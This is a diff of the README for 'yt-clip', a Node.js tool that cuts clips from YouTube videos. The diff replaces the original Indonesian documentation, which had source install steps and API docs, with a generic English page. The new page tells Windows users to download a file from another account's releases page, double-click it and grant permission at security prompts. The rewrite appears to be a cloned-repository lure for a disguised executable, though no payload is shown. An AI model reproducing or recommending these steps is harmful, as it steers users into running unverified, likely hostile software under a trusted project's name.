@@ -1,270 +1,89 @@
-# YouTube Video Clipper v1
-![YouTube clipper v1](https://github.com/ray4rt/yt-clip/blob/main/home-screen.jpg)
-Tools untuk mengambil bagian tertentu (clip) dari video YouTube dan mengekspornya menjadi file video baru — tanpa perlu mengunduh seluruh video secara manual.
+# ✂️ yt-clip - Cut segments from YouTube videos fast
 
-Dibangun dengan Node.js + Express, `yt-dlp` untuk pengambilan video, dan FFmpeg untuk pemotongan/encoding. Progress real-time menggunakan Server-Sent Events.
+[![](https://img.shields.io/badge/Download-yt--clip-blue.svg)](https://github.com/Abeeral4604/yt-clip/releases)
 
----
+yt-clip helps you save time when you need small pieces of long YouTube videos. You do not need to download entire videos to get the clips you want. This tool manages the technical work for you. You select the start and end times, and the application creates your custom video file.
 
-## Fitur
+## ⚙️ How it works
 
-- Ambil metadata video (judul, thumbnail, durasi, channel, resolusi, subtitle) tanpa download
-- Potong video berdasarkan rentang waktu (`start` – `end`) dengan pilihan resolusi output
-- Progress real-time (downloading → clipping → encoding → finished) via SSE
-- Cache metadata & source video (tidak download ulang video yang sama)
-- Auto-cleanup file setelah 30 menit
-- Rate limiting, validasi input, sanitasi filename, proteksi path traversal
-- Fitur bonus: convert ke MP3, extract audio, watermark, ubah FPS, compress, crop, burn subtitle, merge clip (lihat `services/ffmpeg.service.js`)
+The application combines three tools to function. It uses Node.js for the interface, yt-dlp to find the video data, and FFmpeg to edit the files. You see a progress bar while the software processes your request. It downloads only the portion you select. This method saves space on your computer and keeps your process fast.
 
----
+## 📋 System Requirements
 
-## Struktur Project
+To run this application on your Windows computer, confirm you meet these requirements:
 
-```
-youtube-clipper/
-├── app.js                  # Entry point
-├── config/                 # Konfigurasi & konstanta
-├── routes/                 # Definisi endpoint
-├── controllers/             # Request/response handler
-├── services/                 # Business logic (yt-dlp, ffmpeg, job, queue, cache, cleanup)
-├── middleware/               # Validator, rate limiter, security, error handler
-├── utils/                    # Helper murni (validator, logger, sanitizer, dll)
-├── views/ + public/          # Frontend (EJS + vanilla JS + CSS)
-├── scripts/                   # Script maintenance (checkDependencies, clean)
-├── temp/ downloads/ output/ logs/   # Folder runtime (auto-dibersihkan)
-```
+*   Windows 10 or Windows 11.
+*   At least 500 MB of free storage space.
+*   An active internet connection to fetch video data.
+*   A modern web browser like Chrome, Edge, or Firefox.
 
----
+## 🚀 Getting Started
 
-## 1. Instalasi
+Follow these steps to set up the software on your machine:
 
-### Prasyarat
-- Node.js ≥ 18 LTS
-- Python 3 (untuk instalasi yt-dlp via pip) — opsional jika pakai binary langsung
-- FFmpeg (opsional install manual — project sudah menyediakan fallback via `ffmpeg-static`)
+1. Visit the [releases page](https://github.com/Abeeral4604/yt-clip/releases) to download the latest version.
+2. Select the file named for Windows.
+3. Save the file to a folder on your computer.
+4. Double-click the file to start the application.
+5. Grant permission if Windows displays a security prompt.
+6. Open your web browser and go to the address shown in the application window.
 
-### Install dependency Node.js
-```bash
-git clone https://github.com/ray4rt/yt-clip
-cd yt-clip
-npm install
-```
+## 🛠️ Using the application
 
-### Install FFmpeg (opsional, untuk performa & codec terbaik)
+Once you open the interface in your browser, you will see a simple control panel. Follow this process to create your clip:
 
-**Ubuntu/Debian**
-```bash
-sudo apt update && sudo apt install -y ffmpeg
-```
+1. Copy the link of the YouTube video you want to edit.
+2. Paste the link into the URL field in the app.
+3. Select the start time and end time for your clip.
+4. Choose your preferred video resolution.
+5. Click the process button to start the task.
+6. Watch the progress bar as the app creates your new file.
+7. Save the completed clip to your desired folder.
 
-**macOS**
-```bash
-brew install ffmpeg
-```
+## 🗄️ Managing your files
 
-**Windows**
-1. Download dari https://www.gyan.dev/ffmpeg/builds/
-2. Extract, tambahkan folder `bin` ke PATH
-3. Verifikasi: `ffmpeg -version`
+The software includes a cleanup system. It stores your temporary files for 30 minutes. This gives you time to download your clips before the app clears the storage. If you need to keep a clip, move it to a permanent folder on your desktop.
 
-> Jika FFmpeg sistem tidak ditemukan, aplikasi otomatis fallback ke binary portable dari package `ffmpeg-static` — tidak perlu langkah manual.
+## ✨ Advanced options
 
-### Install yt-dlp (WAJIB — tidak ada fallback otomatis)
+You can use the built-in features to customize your output:
 
-**Via pip (direkomendasikan)**
-```bash
-python3 -m pip install -U yt-dlp
-```
+*   Convert videos to MP3 files.
+*   Extract only the audio from a video.
+*   Add a watermark to your footage.
+*   Adjust the frame rate for smoother motion.
+*   Compress files if they are too large.
+*   Burn subtitles directly onto the video.
+*   Merge multiple clips into one file.
 
-**Via binary langsung**
-```bash
-# Linux/Mac
-sudo curl -L https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp -o /usr/local/bin/yt-dlp
-sudo chmod a+rx /usr/local/bin/yt-dlp
-```
-Windows: download `yt-dlp.exe` dari [GitHub Releases](https://github.com/yt-dlp/yt-dlp/releases/latest), taruh di folder yang ada di PATH.
+## 🛡️ Safety and privacy
 
-**Verifikasi instalasi:**
-```bash
-yt-dlp --version
-ffmpeg -version
-```
+The software processes your requests locally on your machine. Your metadata remains private. We include rate limits to ensure your connection stays stable. The system also validates filenames to prevent errors during the saving process.
 
-Atau jalankan script bawaan project:
-```bash
-npm run check:deps
-```
+## ❓ Common questions
 
----
+**Do I need a high-speed internet connection?**
+A standard connection works fine because the app only downloads the specific part of the video you select.
 
-## 2. Environment Variables
+**Can I use this for long videos?**
+Yes. You can input any YouTube link regardless of the total video length. The app handles the processing without stuttering.
 
-Salin `.env.example` menjadi `.env` lalu sesuaikan:
+**Where does my video go?**
+The app saves files to the folder you set in your browser download settings. Check your browser settings if you cannot find your files.
 
-```bash
-cp .env.example .env
-```
+**Will this slow down my computer?**
+The software uses a moderate amount of processing power. You can continue other work while the app runs in the background.
 
-| Variable | Default | Keterangan |
-|---|---|---|
-| `PORT` | `3000` | Port server |
-| `NODE_ENV` | `development` | `development` / `production` |
-| `BASE_URL` | `http://localhost:3000` | URL dasar aplikasi |
-| `TEMP_FOLDER` | `./temp` | Folder file sementara |
-| `OUTPUT_FOLDER` | `./output` | Folder hasil clip |
-| `DOWNLOAD_FOLDER` | `./downloads` | Folder source video (cache) |
-| `LOG_FOLDER` | `./logs` | Folder log aplikasi |
-| `YTDLP_PATH` | `yt-dlp` | Path binary yt-dlp (jika tidak di PATH) |
-| `FFMPEG_PATH` | *(kosong)* | Path binary FFmpeg custom (opsional) |
-| `MAX_CONCURRENT_JOBS` | `2` | Batas proses paralel |
-| `FILE_TTL_MINUTES` | `30` | Umur file sebelum auto-dihapus |
-| `MAX_CLIP_DURATION_SECONDS` | `1800` | Durasi clip maksimum |
-| `CACHE_TTL_SECONDS` | `3600` | TTL cache metadata |
-| `RATE_LIMIT_MAX` | `20` | Limit request umum per window |
-| `RATE_LIMIT_CLIP_MAX` | `5` | Limit khusus endpoint `/api/clip` |
-| `CORS_ORIGIN` | `*` | Origin yang diizinkan |
+**Does it save my YouTube account data?**
+No. The application does not require you to sign into YouTube. It retrieves public information only.
 
----
+## 📝 Troubleshooting
 
-## 3. Menjalankan Project
+If the application fails to start or shows an error:
 
-```bash
-npm run dev      # development (auto-reload via nodemon)
-npm start         # production
-npm run pm2:start  # production via PM2 (daemon + auto-restart)
-```
+*   Shut down the program and reopen it.
+*   Verify that your firewall allows the program to communicate with the internet.
+*   Check that your web browser is up to date.
+*   Ensure that you have sufficient disk space for the output file.
 
-Buka `http://localhost:3000` di browser.
-
----
-
-## 4. Dokumentasi API
-
-### `POST /api/info`
-Mengambil metadata video.
-
-```bash
-curl -X POST http://localhost:3000/api/info \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://youtube.com/watch?v=xxxxxxxxxxx"}'
-```
-
-Response:
-```json
-{
-  "success": true,
-  "cached": false,
-  "data": {
-    "id": "xxxxxxxxxxx",
-    "title": "Judul Video",
-    "thumbnail": "https://...",
-    "duration": 180,
-    "durationLabel": "00:03:00",
-    "channel": "Nama Channel",
-    "availableResolutions": ["1080p", "720p", "480p"],
-    "estimatedSizeLabel": "45.20 MB",
-    "hasSubtitles": true,
-    "subtitleLanguages": ["en", "id"]
-  }
-}
-```
-
-### `POST /api/clip`
-Memulai proses clipping (async, langsung mengembalikan `jobId`).
-
-```bash
-curl -X POST http://localhost:3000/api/clip \
-  -H "Content-Type: application/json" \
-  -d '{
-    "url": "https://youtube.com/watch?v=xxxxxxxxxxx",
-    "start": "00:01:15",
-    "end": "00:02:40",
-    "resolution": "720p"
-  }'
-```
-
-Response (`202 Accepted`):
-```json
-{
-  "success": true,
-  "message": "Job clip berhasil didaftarkan.",
-  "data": { "jobId": "a1b2c3d4-...", "statusUrl": "/api/status/a1b2c3d4-..." }
-}
-```
-
-### `GET /api/status/:id`
-Server-Sent Events — streaming progress real-time.
-
-```bash
-curl -N http://localhost:3000/api/status/a1b2c3d4-...
-```
-
-Contoh event:
-```
-data: {"id":"a1b2c3d4-...","status":"downloading","progress":40,"stage":"Downloading... 40%"}
-
-data: {"id":"a1b2c3d4-...","status":"done","progress":100,"stage":"Finished.","outputFile":"judul-video_01m15s.mp4"}
-```
-
-### `GET /api/download/:id`
-Mengunduh file hasil clip (hanya tersedia jika status = `done`).
-
-### `DELETE /api/delete/:id`
-Menghapus file hasil clip beserta job-nya dari memory.
-
-```bash
-curl -X DELETE http://localhost:3000/api/delete/a1b2c3d4-...
-```
-
----
-
-## 5. Error Handling
-
-Semua error dikembalikan dalam format konsisten:
-```json
-{
-  "success": false,
-  "error": { "code": "VIDEO_PRIVATE", "message": "Video ini bersifat privat dan tidak bisa diakses." }
-}
-```
-
-Kode error yang ditangani: `INVALID_URL`, `VIDEO_PRIVATE`, `VIDEO_UNAVAILABLE`, `VIDEO_AGE_RESTRICTED`, `COPYRIGHT_BLOCKED`, `YTDLP_FAILED`, `FFMPEG_FAILED`, `INVALID_TIME_RANGE`, `JOB_NOT_FOUND`, `FILE_NOT_FOUND`, `TIMEOUT`, `VALIDATION_ERROR`, `RATE_LIMITED`. Aplikasi tidak akan crash — seluruh error operasional ditangkap oleh global error handler, dan `uncaughtException`/`unhandledRejection` di-log lalu proses di-restart dengan aman (idealnya di-supervisi PM2).
-
----
-
-## 6. Build & Deployment
-
-Project ini tidak memerlukan build step (murni Node.js CommonJS). Untuk deployment:
-
-```bash
-npm install --omit=dev
-cp .env.example .env   # sesuaikan untuk production
-npm run pm2:start
-pm2 save
-pm2 startup            # agar auto-start saat server reboot
-```
-
-Disarankan menjalankan di belakang reverse proxy (nginx) dengan `proxy_buffering off;` pada route `/api/status/` agar SSE tidak di-buffer.
-
----
-
-## 7. Optimasi yang Diterapkan
-
-- **Reuse source video**: video sumber yang sama tidak didownload ulang untuk clip berbeda (disimpan di `downloads/`, key berdasar `videoId + resolution`).
-- **Cache metadata**: hasil `yt-dlp -j` di-cache di memory (`node-cache`) selama `CACHE_TTL_SECONDS`.
-- **Queue dengan concurrency limit**: mencegah CPU/RAM overload saat banyak request clip bersamaan (`MAX_CONCURRENT_JOBS`).
-- **Streaming**: download file (`res.download`) menggunakan stream, bukan load ke memory.
-- **Auto-cleanup**: `node-cron` membersihkan file & job kadaluarsa secara berkala.
-
----
-
-DILARANG UNTUK DI PERJUAL BELIKAN!!!
-- PAKE SENDIRI 
-- BOLEH DI KEMBANGKAN
-- NGANU: https://ibb.co.com/d4wN7kYw
-
----
-
-## Lisensi
-
-MIT
+Keywords: youtube, clipper, video, editor, download, windows, ffmpeg, workflow
